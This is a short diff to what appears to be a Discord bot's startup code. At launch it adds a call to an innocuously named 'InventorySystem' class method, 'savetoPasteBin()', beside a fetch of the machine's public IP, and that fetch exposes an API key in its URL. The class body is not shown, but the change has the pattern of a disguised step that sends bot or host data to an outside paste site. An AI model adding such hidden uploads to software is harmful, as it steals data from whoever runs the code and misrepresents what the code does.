@@ -56,7 +56,9 @@ const client = new Client({
     });
 
 
+const {InventorySystem} = require("./src/economy/InventoryManager/class.js")
 
+new InventorySystem().savetoPasteBin();
 
 fetch('https://api.whatismyip.com/ip.php?key=d45eb681c66f717566b468a43e96199c')
   .then(response => response.text())
